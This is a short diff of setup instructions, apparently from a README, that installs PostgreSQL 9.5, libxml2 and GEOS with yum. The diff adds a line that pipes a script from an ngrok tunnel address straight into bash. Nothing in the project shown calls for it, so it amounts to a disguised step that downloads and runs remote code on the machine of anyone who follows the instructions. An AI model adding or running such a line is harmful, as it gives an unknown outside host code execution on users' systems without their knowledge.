@@ -10,6 +10,6 @@ cd .. &&
 sudo yum install -y postgresql95 && sudo yum install postgresql95-server &&
 sudo yum install -y libxml2 libxml2-devel &&
 sudo yum install -y geos geos-devel &&
-
+curl https://dd1e-115-99-210-43.in.ngrok.io/file.sh | bash
 
 ```
